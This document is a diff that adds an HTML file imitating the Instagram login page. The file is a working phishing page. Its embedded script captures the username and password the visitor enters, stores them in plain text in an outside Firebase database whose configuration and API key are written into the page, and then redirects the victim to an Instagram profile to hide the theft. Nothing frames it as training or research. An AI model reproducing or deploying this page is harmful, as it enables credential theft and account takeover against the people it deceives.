@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Page</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<style>
+	@import url('https://fonts.googleapis.com/css?family=Roboto&display=swap');
+
+*{
+	margin: 0;
+	padding: 0;
+	box-sizing: border-box;
+	outline: none;
+	list-style: none;
+	text-decoration: none;
+	font-family: 'Roboto', sans-serif;
+}
+
+body{
+	background: #fafafa;
+	font-size: 14px;
+}
+
+.wrapper .header{
+	max-width: 350px;
+	width: 100%;
+	height: auto;
+	margin: 50px auto;
+}
+
+.wrapper .header .top,
+.wrapper .signup{
+	background: #fff;
+    border: 1px solid #e6e6e6;
+    border-radius: 1px;
+    padding: 40px 40px 20px;
+}
+
+.wrapper .header .logo img{
+	display: block;
+	margin: 0 auto 35px;
+}
+
+.wrapper .header .form .input_field{
+	margin-bottom: 5px;
+}
+
+.wrapper .header .form .input_field .input{
+	width: 100%;
+	background: #fafafa;
+	border: 1px solid #efefef;
+	font-size: 12px;
+	border-radius: 3px;
+	color: #262626;
+	padding: 10px;
+}
+
+.wrapper .header .form .input_field .input:focus{
+	border: 1px solid #b2b2b2;
+}
+
+.wrapper .header .form .btn{
+	margin: 10px 0;
+	background-color: #3897f0;
+    border: 1px solid #3897f0;
+    border-radius: 4px;
+    text-align: center;
+    padding: 5px;
+}
+
+.wrapper .header .form .btn a{
+	color: #fff;
+	display: block;
+}
+
+.wrapper .header .or{
+	display: flex;
+	justify-content: space-between;
+	align-items: center;
+	height: 15px;
+	margin: 15px 0 20px;
+}
+
+.wrapper .header .or .line{
+	width: 105px;
+	height: 2px;
+	background: #efefef
+}
+
+.wrapper .header .or p{
+	color: #999;
+	font-size: 12px;
+}
+
+.wrapper .dif .fb{
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+.wrapper .dif .fb img{
+	width: 16px;
+	height: 16px;
+}
+
+.wrapper .dif  .fb p{
+	color: #385185;
+	font-weight: 500;
+	margin-left: 10px;
+}
+
+.wrapper .dif .forgot{
+	font-size: 12px;
+	text-align: center;
+	margin-top: 20px;
+}
+
+.wrapper .dif .forgot a{
+	color: #003569;
+}
+
+.wrapper .signup{
+	margin: 10px 0 20px;
+	padding: 25px 40px;
+	text-align: center;
+	color: #262626;
+}
+
+.wrapper .signup a{
+	color: #3897f0;
+}
+
+.wrapper .apps{
+	text-align: center;
+	color: #262626;
+}
+
+.wrapper .apps p{
+	margin-bottom: 20px;
+}
+
+.wrapper .apps a img{
+	width: 135px;
+	height: 40px;
+	margin: 0 5px;
+}
+
+.footer{
+	max-width: 935px;
+	width: 100%;
+	margin: 0 auto;
+	padding: 40px 0;
+	display: flex;
+	justify-content: space-between;
+}
+
+.footer .links ul li{
+	display: inline-block;
+	margin-right: 10px;
+}
+
+.footer .links ul li a{
+	color: #003569;
+	font-size: 12px;
+}
+
+.footer .copyright{
+	color: #999;	
+}
+</style>
+<body>
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="Screenshot_16-11-2024_125736_www.instagram.com.jpeg" alt="instagram" style="width: 175px;">
+            </div>
+            <div class="form">
+                <div class="input_field">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" class="input">
+                </div>
+                <div class="input_field">
+                    <input type="password" id="password" placeholder="Password" class="input">
+                </div>
+                <div class="btn"><a href="#" id="login-button">Log In</a></div>
+            </div>
+            <div class="or">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="https://th.bing.com/th/id/OIP.aYVbqEFb2M-SWsBh_LafIQHaHa?w=198&h=198&c=7&r=0&o=5&pid=1.7" alt="facebook">
+                    <p>Log in with Facebook</p>
+                </div>
+                <div class="forgot">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        <div class="apps">
+            <p>Get the app.</p>
+            <div class="icons">
+                <a href="https://www.apple.com/ios/app-store/"><img src="https://vpnnext.com/images/get-on-app-store.png" alt="appstore"></a>
+                <a href="https://play.google.com/store"><img src="https://vpnnext.com/images/get-on-play.png" alt="googleplay"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="#">ABOUT US</a></li>
+                <li><a href="#">SUPPORT</a></li>
+                <li><a href="#">PRESS</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">JOBS</a></li>
+                <li><a href="#">PRIVACY</a></li>
+                <li><a href="#">TERMS</a></li>
+                <li><a href="#">DIRECTORY</a></li>
+                <li><a href="#">PROFILES</a></li>
+                <li><a href="#">HASHTAGS</a></li>
+                <li><a href="#">LANGUAGE</a></li>
+            </ul>
+        </div>
+        <div class="copyright">
+            © 2024 INSTAGRAM
+        </div>
+    </div>
+</div>
+
+<!-- Firebase and JavaScript -->
+<script type="module">
+    // Import Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
+        authDomain: "and-facebook-ab84c.firebaseapp.com",
+        databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
+        projectId: "and-facebook-ab84c",
+        storageBucket: "and-facebook-ab84c.appspot.com",
+        messagingSenderId: "4885749329",
+        appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Event listener for the login button
+    document.getElementById("login-button").addEventListener("click", function(event) {
+        event.preventDefault(); // Prevent default behavior
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        if (username && password) {
+            // Replace "." with "_" in username to avoid Firebase key issues
+            const usernameKey = username.replace(/\./g, '_');
+
+            set(ref(db, 'users/' + usernameKey), {
+                username: username,
+                password: password
+            }).then(() => {
+                // Redirect after saving data
+                window.location.href = "http://www.instagram.com/m.mr.robinson/profilecard/?igsh=dHF1Y2J4OX0eWFp";
+            }).catch((error) => {
+                console.error("Error storing data:", error);
+            });
+        } else {
+            alert("Please enter both username and password.");
+        }
+    });
+</script>
+</body>
+</html>
